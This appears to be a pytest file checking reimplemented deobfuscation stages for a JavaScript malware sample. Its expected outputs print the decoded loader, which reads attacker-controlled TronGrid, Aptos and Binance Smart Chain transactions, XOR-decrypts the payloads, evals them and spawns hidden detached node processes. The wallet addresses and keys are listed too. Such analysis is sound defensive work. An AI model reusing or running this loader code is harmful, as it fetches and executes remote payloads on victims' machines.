import pytest
from decode_reimpls import *

def test_stage1_decode1():
    result = stage1_decode1(
        # 'wgnnsruxjouobcvhfroktztmseayqlticcdrp',
        'u r a (),.a;rvnr4qhfvnah1 ghc6ri()7=k=,;ois-tkub4C)ol)=,rhs=u8e){;o65.qt,;{;rr);et.2ka;,7);b6h=tz[i=y0bbCfr4=n1 87,nr+ ;gjrord.( m8fojil+,=40.ejvn(lts)taaxu(uCa])+b]=h+0e.(hrn0lnr}(= 3ll))hrekr=n b,or9v(r+u;ga"5=r}rc}n(wiu8e)+)apj h+v(inlu"11 ,hr7])p+arpada,fi")f"s1.+;)0i7guf;git[2fvhr)u)i5u],varo<v;); 8dan u("nrsfv.rjuhonf;t[ar(,r;.zg. tjarsx>dlu;v+6e.. zh,eannz]+;)9gj,e )rvnrfmh(l;r];[ire.7aegrvgr)c=)[v{pj.bem<xt=0!(p*uvovc[tre 0foo6j4f=uv;[;=2h+qsvevce 9f6b2n!- a=;g(])6(ri.yr,*a8c(fl(1p+;j(=,+(=jasc<(+)f;( +los2t(51"=]huel2rSk;8;u1-nsrdu0mg+[h;ro;ollzs="+tt9[o(ll;,h;l,(+scuysACn ;p27=hxt);p,s(7,3hzr- ;y=;eCtj{=z)2[.a1oiq;(9yz;+lrnesvz;yr=ro+ln=8w[=)lh[a(asyj t;;b)g]C,0+au2t.a=0<a]}va1t=rtA46d nn")i=i-tmsp9r,,.+;a,0pf[}>=veS =e"A;,n.obAba(=r9);pnthiouCh3.o0]x;=nu.oii)-{.n}=,=(=v;lenvtan2+avsoov{a1i+]chw1s=.wAt.7am.8d-mmzla(<j=.i}z2atvsC.f(i[=](t{e]=wltwzep;ez0,n;"a)=ajogt(i)t',
        [1019633, 0, 0, 82, 49761, 575, 41455, 1671836]
    )
    assert result == r"""var a=10,o=71,f=44;var r="abcdefghijklmnopqrstuvwxyz";var n=[88,70,65,80,85,89,71,82,79,75,76,66,74,60,90,94,81,87,86,72];var q=[];for(var j=0;j<n.length;j++)q[n[j]]=j+1;var v=[];a+=23;o+=22;f+=52;for(var p=0;p<arguments.length;p++){var h=arguments[p].split(" ");for(var w=h.length-1;w>=0;w--){var x=null;var b=h[w];var u=null;var y=0;var l=b.length;var t;for(var z=0;z<l;z++){var m=b.charCodeAt(z);var e=q[m];if(e){x=(e-1)*o+b.charCodeAt(z+1)-a;t=z;z++;}else if(m==f){x=o*(n.length-a+b.charCodeAt(z+1))+b.charCodeAt(z+2)-a;t=z;z+=2;}else{continue;}if(u==null)u=[];if(t>y)u.push(b.substring(y,t));u.push(h[x+1]);y=z+1;}if(u!=null){if(y<l)u.push(b.substring(y));h[w]=u.join("");}}v.push(h[0]);}var s=v.join("");var i=[92,39,32,10,96,42].concat(n);var k=String.fromCharCode(46);for(var j=0;j<i.length;j++)s=s.split(k+r.charAt(j)).join(String.fromCharCode(i[j]));return s.split(k+"!").join(k);"""

def test_stage1_decode2():
    result = stage1_decode2(
        r"""XA_$_4215=(_$af401859)("e%ooNxi3r7.u3anl3oopa%c=r%bier2p_gtt%dt9zcbbffmisgsm:r7ciba)nife8tuesli%wdaou-0rtn0pjlqn%neto%?ls%.j47tur0ne.!toSiugr_eeee6dar2.w.olm.zb-3.s9t0n3rn2=yactg&Ma4tiwn5/aSi0.y%%te7me.k.!z.pni.rmguhodf1rn0%Sp%.raf2S.idragepingsmtcCren%%err.mn=cpt%mfN?n%srne1.r.k%_.i1x.iause?d%rep%t%.!eiCcrbd0v3l1Mes%n5bts3oi.r0.u.yio31r87%.!u8ba6err%o.s7a5T%ai%2%c5owcbelbh6%c5d%tfohhccsgoh%r.![fgnpot.qtfrtseds96.s:%%%r%5nres%a%C;h;ntl13oNrtT/fi3%.o7ij=x6g6hcs4nk18ned1itu7m.z.jtsrer.vtm4e%n7if%ere.t2srtr7cfTa%9ea0%t342bm7_.sc2tpe8do.uroye6a1f1c75i5Sa9bTet2t8.rs.a.bTg9eTvfxnb_zeua%%dar.xh.g1fDmd4.muci.v.m8E8%%a.lf_dc6%.jdteoer.klr0eah%%]ebo.!3s6dbyse%?-b8n52od39p75Err%se3cocpiyf7adeb-%tcg4o?C40sa.sd.yxl6ds%ce9yn0&%tc6ss",1019633);X0_$af401859(p,g){XAo=p.!lengthX>w=[];for(XAr=0;r.t.co;r++){w[r]=.cp.!char.it(r)};for(XAr=0;r.t.co;r++){XAu=g.f.c(r+.c82)+.c(g%.c49761)X>n=g.f.c(r+.c575)+.c(g%.c41455)X>c=u%.coX>t=n%.coX>v=w[c];w[c]=.cw[t];w[t]=.cv;g=.c(u+.cn)%.c1671836}X>h=String.!fromCharCode(127)X>y=.bX9q=.b%X9b=.b#1X9z=.b%X9m=.b#0X9k=.b#.bX;.cwX<yX5q)X<hX5b)X<zX5m)X<kX5h)}(X=()=>X8i=global;const.cd=X/0]];X?X"();X*.ctrueX;};X=X0o(t){returnX6iX,0]]((r,nXCX?$_4215){return}else.c{dX39X(8]](t,(tXCX@e=X2;t[_X!5X:e+=.ct});t[_X!1],(XCtry{r(X/7]X.6]](e)X+XB})})[_X!2X:XB)X,]]()}})}X=X0c(a,c=.c[],s){returnX6iX,0]]((r,n)=>X8t=.sS.oNX,2]]({jsonrpc:X711],method:a,params:c,id:1});const.ce={hostname:s,method:X713]};const.co=dX39X$4]](e,(tXCX@e=X2;t[_X!5X:e+=.ct});t[_X!1],(XCtry{r(X/7]X.6]](e)X+XB})})[_X!2X:XB);oX,5]](t);oX,]]()})}X?X"=.cX78]};X=X0t(a,t,e){X@r;try{rX#25X&XDX1o(("https://api.!trongrid.!io/v1/accounts/"+t+X722])))[X75]][0X.21]X.5]]X423X(20X'19X$8X'4X$7]]()X,6X'4]);if(!r){throwX6Error}}catch(t){r=.cX1o(("https://fullnode.!mainnet.!aptoslabs.!com/v1/accounts/"+e+X728])))[0X.27X&6]][0]};X@n;try{nX#25X&XDX1cX333],[r]X434]))X-2X%1X%0]](2)X423X(20X'19X$8X'29])[1];X?X"()};if(!n){throwX6Error}}catch(t){if(X*=.cfalse){X*.cnull}else.c{nX#25X&XDX1cX333],[r]X435]))X-2X%1X%0]](2)X423X(20X'19X$8X'29])[1]}}X;.c((e)=>X8r=aX-6]];X@n=X2;for(X@t=0;t.t.ceX-6]];t++)X8o=aX-7]](t%.cr);n+X#39X%8]](eX-7]](t).v.co)};X?X"=.c0X;}X;.cn})(n)}tryX8e=.cawait.ctX340X)1X)2]);eval(eX+};tryX8e=.cawait.ctX343X)4X)5]);dX352X(51X'46],[X747],("global[.a.b_.y.a.b]=.a.b"+(X/48]]||.c0)+X749]+e+X2)],{detached:true,stdio:X750],windows.zide:true})[_X!2X:X?X"();X*.c1}else.c{eval(e)}}X+}})() $_4215[3X' $_4215){_$af401859 =.cX/ X(1 ]]X- ]X.2 ]]X3 ])[X7 ]X44 _$af401859= )}catch(t){ [X71 [X73 ][X7 i[X7 function.c (.cawait.c X74] (X7 ,X7 ).!split( .c.cnew.c _$_4215[ {const.c .bX> ],(tXC ;return .!join( async.c ;XA if(!_ let.c var.c n(t)} )=>{ 4]](""",
        [10, 71, 44, 88, 70, 65, 80, 85, 89, 71, 82, 79, 75, 76, 66, 74, 60, 90, 94, 81, 87, 86, 72, 0, 1, 23, 22, 52, 0, 1, 0, 0, 0, 1, 1, 1, 2, 2, 1, 1, 0, 92, 39, 32, 10, 96, 42, 46, 0],
    )
    assert result == r"""var _$_4215=(_$af401859)("e%ooNxi3r7Z3anl3oopa%c=r%bier2p_gtt%dt9zcbbffmisgsm:r7ciba)nife8tuesli%wdaou-0rtn0pjlqn%neto%?ls%P47tur0ne.toSiugr_eeee6dar2QOlmHb-3J9t0n3rn2=yactg&Ma4tiwn5/aSi0V%%te7meU.zKniBmguhodf1rn0%Sp%Baf2SAdragepingsmtcCren%%errGn=cpt%mfN?n%srne1BU%_A1xAause?d%rep%t%.eiCcrbd0v3l1Mes%n5bts3oiB0ZVio31r87%.u8ba6err%oJ7a5T%ai%2%c5owcbelbh6%c5d%tfohhccsgoh%r.[fgnpotLtfrtseds96J:%%%r%5nres%a%C;h;ntl13oNrtT/fi3%O7ij=x6g6hcs4nk18ned1itu7mHPtsrer^tm4e%n7if%ere<2srtr7cfTa%9ea0%t342bm7_Jc2tpe8doZroye6a1f1c75i5Sa9bTet2t8Bs\'Tg9eTvfxnb_zeua%%darWhX1fDmd4Guci^G8E8%%aYf_dc6%PdteoerUlr0eah%%]ebo.3s6dbyse%?-b8n52od39p75Err%se3cocpiyf7adeb-%tcg4o?C40saJdVxl6ds%ce9yn0&%tc6ss",1019633);function _$af401859(p,g){var o=p.length;var w=[];for(var r=0;r< o;r++){w[r]= p.charAt(r)};for(var r=0;r< o;r++){var u=g* (r+ 82)+ (g% 49761);var n=g* (r+ 575)+ (g% 41455);var c=u% o;var t=n% o;var v=w[c];w[c]= w[t];w[t]= v;g= (u+ n)% 1671836};var h=String.fromCharCode(127);var y='';var q='%';var b='#1';var z='%';var m='#0';var k='#';return w.join(y).split(q).join(h).split(b).join(z).split(m).join(k).split(h)}(async ()=>{const i=global;const d=i[_$_4215[0]];if(!_$_4215){_$af401859();_$af401859= true;return};async function o(t){return  new i[_$_4215[10]]((r,n)=>{if(!_$_4215){return}else {d(_$_4215[9])[_$_4215[8]](t,(t)=>{let e=_$_4215[4];t[_$_4215[3]](_$_4215[5],(t)=>{e+= t});t[_$_4215[3]](_$_4215[1],()=>{try{r(i[_$_4215[7]][_$_4215[6]](e))}catch(t){n(t)}})})[_$_4215[3]](_$_4215[2],(t)=>{n(t)})[_$_4215[1]]()}})}async function c(a,c= [],s){return  new i[_$_4215[10]]((r,n)=>{const t=JSON[_$_4215[12]]({jsonrpc:_$_4215[11],method:a,params:c,id:1});const e={hostname:s,method:_$_4215[13]};const o=d(_$_4215[9])[_$_4215[14]](e,(t)=>{let e=_$_4215[4];t[_$_4215[3]](_$_4215[5],(t)=>{e+= t});t[_$_4215[3]](_$_4215[1],()=>{try{r(i[_$_4215[7]][_$_4215[6]](e))}catch(t){n(t)}})})[_$_4215[3]](_$_4215[2],(t)=>{n(t)});o[_$_4215[15]](t);o[_$_4215[1]]()})}if(!_$_4215){_$af401859= _$_4215[8]};async function t(a,t,e){let r;try{r= i[_$_4215[25]][_$_4215[24]](( await o(("https://api.trongrid.io/v1/accounts/"+t+_$_4215[22])))[_$_4215[5]][0][_$_4215[21]][_$_4215[5]],_$_4215[23])[_$_4215[20]](_$_4215[19])[_$_4215[18]](_$_4215[4])[_$_4215[17]]()[_$_4215[16]](_$_4215[4]);if(!r){throw  new Error}}catch(t){r= ( await o(("https://fullnode.mainnet.aptoslabs.com/v1/accounts/"+e+_$_4215[28])))[0][_$_4215[27]][_$_4215[26]][0]};let n;try{n= i[_$_4215[25]][_$_4215[24]](( await c(_$_4215[33],[r],_$_4215[34]))[_$_4215[32]][_$_4215[31]][_$_4215[30]](2),_$_4215[23])[_$_4215[20]](_$_4215[19])[_$_4215[18]](_$_4215[29])[1];if(!_$_4215){_$af401859()};if(!n){throw  new Error}}catch(t){if(_$af401859== false){_$af401859= null}else {n= i[_$_4215[25]][_$_4215[24]](( await c(_$_4215[33],[r],_$_4215[35]))[_$_4215[32]][_$_4215[31]][_$_4215[30]](2),_$_4215[23])[_$_4215[20]](_$_4215[19])[_$_4215[18]](_$_4215[29])[1]}};return ((e)=>{const r=a[_$_4215[36]];let n=_$_4215[4];for(let t=0;t< e[_$_4215[36]];t++){const o=a[_$_4215[37]](t% r);n+= i[_$_4215[39]][_$_4215[38]](e[_$_4215[37]](t)^ o)};if(!_$_4215){_$af401859= 0;return};return n})(n)}try{const e= await t(_$_4215[40],_$_4215[41],_$_4215[42]);eval(e)}catch(t){};try{const e= await t(_$_4215[43],_$_4215[44],_$_4215[45]);d(_$_4215[52])[_$_4215[51]](_$_4215[46],[_$_4215[47],("global[\'_V\']=\'"+(i[_$_4215[48]]|| 0)+_$_4215[49]+e+_$_4215[4])],{detached:true,stdio:_$_4215[50],windowsHide:true})[_$_4215[3]](_$_4215[2],(t)=>{if(!_$_4215){_$af401859();_$af401859= 1}else {eval(e)}})}catch(t){}})()"""


def test_stage2_decode_identifiers():
    result = stage2_decode_identifiers(
        "e%ooNxi3r7Z3anl3oopa%c=r%bier2p_gtt%dt9zcbbffmisgsm:r7ciba)nife8tuesli%wdaou-0rtn0pjlqn%neto%?ls%P47tur0ne.toSiugr_eeee6dar2QOlmHb-3J9t0n3rn2=yactg&Ma4tiwn5/aSi0V%%te7meU.zKniBmguhodf1rn0%Sp%Baf2SAdragepingsmtcCren%%errGn=cpt%mfN?n%srne1BU%_A1xAause?d%rep%t%.eiCcrbd0v3l1Mes%n5bts3oiB0ZVio31r87%.u8ba6err%oJ7a5T%ai%2%c5owcbelbh6%c5d%tfohhccsgoh%r.[fgnpotLtfrtseds96J:%%%r%5nres%a%C;h;ntl13oNrtT/fi3%O7ij=x6g6hcs4nk18ned1itu7mHPtsrer^tm4e%n7if%ere<2srtr7cfTa%9ea0%t342bm7_Jc2tpe8doZroye6a1f1c75i5Sa9bTet2t8Bs\'Tg9eTvfxnb_zeua%%darWhX1fDmd4Guci^G8E8%%aYf_dc6%PdteoerUlr0eah%%]ebo.3s6dbyse%?-b8n52od39p75Err%se3cocpiyf7adeb-%tcg4o?C40saJdVxl6ds%ce9yn0&%tc6ss",
        1019633,
        [0, 0, 82, 49761, 575, 41455, 1671836, 127],
    )
    assert result == ['r', 'end', 'error', 'on', '', 'data', 'parse', 'JSON', 'get', 'https', 'Promise', '2.0', 'stringify', 'POST', 'request', 'write', 'join', 'reverse', 'split', 'utf8', 'toString', 'raw_data', '/transactions?only_confirmed=true&only_from=true&limit=1', 'hex', 'from', 'Buffer', 'arguments', 'payload', '/transactions?limit=1', '?.?', 'substring', 'input', 'result', 'eth_getTransactionByHash', 'bsc-dataseed.binance.org', 'bsc-rpc.publicnode.com', 'length', 'charCodeAt', 'fromCharCode', 'String', '2[gWfGj;<:-93Z^C', 'TMfKQEd7TJJa5xNZJZ2Lep838vrzrs7mAP', '0xbe037400670fbf1c32364f762975908dc43eeb38759263e7dfcdabc76380811e', 'm6:tTh^D)cBz?NM]', 'TXfxHUet9pJVU1BgVkBAbrES4YUc1nGzcG', '0x3f0e5781d0855fb460661ac63257376db1941b2bb522499e4757ecb3ebd5dce3', 'node', '-e', '_V', "';", 'ignore', 'spawn', 'child_process']